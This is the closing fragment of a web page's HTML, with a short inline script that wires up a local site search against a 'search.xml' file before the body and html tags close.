     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
